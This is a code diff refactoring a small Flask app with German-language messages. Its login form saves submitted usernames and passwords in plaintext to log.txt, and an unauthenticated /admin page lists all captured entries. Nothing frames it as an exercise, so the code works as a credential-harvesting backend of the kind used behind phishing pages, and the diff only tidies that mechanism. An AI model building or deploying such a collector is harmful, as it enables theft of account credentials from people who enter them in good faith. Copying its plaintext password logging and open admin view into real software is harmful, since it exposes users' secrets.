@@ -4,15 +4,16 @@ import os
 
 app = Flask(__name__)
 
+LOG_FILE = "log.txt"
+
 @app.route("/", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
 
-        # Sicherstellen, dass log.txt existiert
         try:
-            with open("log.txt", "a") as f:
+            with open(LOG_FILE, "a") as f:
                 f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Username: {username} | Password: {password}\n")
         except Exception as e:
             return f"<h3>Fehler beim Speichern: {str(e)}</h3>"
@@ -23,21 +24,20 @@ def login():
 
 @app.route("/admin")
 def admin():
-    log_path = "log.txt"
-    if not os.path.exists(log_path):
-        # Datei erzeugen, wenn sie fehlt
-        open(log_path, "w").close()
+    # Falls Datei fehlt, automatisch erzeugen
+    if not os.path.exists(LOG_FILE):
+        with open(LOG_FILE, "w") as f:
+            f.write("")
 
     try:
-        with open(log_path, "r") as f:
+        with open(LOG_FILE, "r") as f:
             logs = f.readlines()
 
         if not logs:
             return "<h3>Es wurden noch keine Daten eingegeben.</h3>"
 
-        # HTML-safe Ausgabe
-        content = "<br>".join(line.strip().replace("<", "&lt;").replace(">", "&gt;") for line in logs)
-        return f"<h3>Login-Daten:</h3><div style='font-family: monospace'>{content}</div>"
+        output = "<br>".join(line.strip().replace("<", "&lt;").replace(">", "&gt;") for line in logs)
+        return f"<h3>Login-Daten:</h3><div style='font-family: monospace;'>{output}</div>"
 
     except Exception as e:
         return f"<h3>Fehler beim Anzeigen der Logs: {str(e)}</h3>"
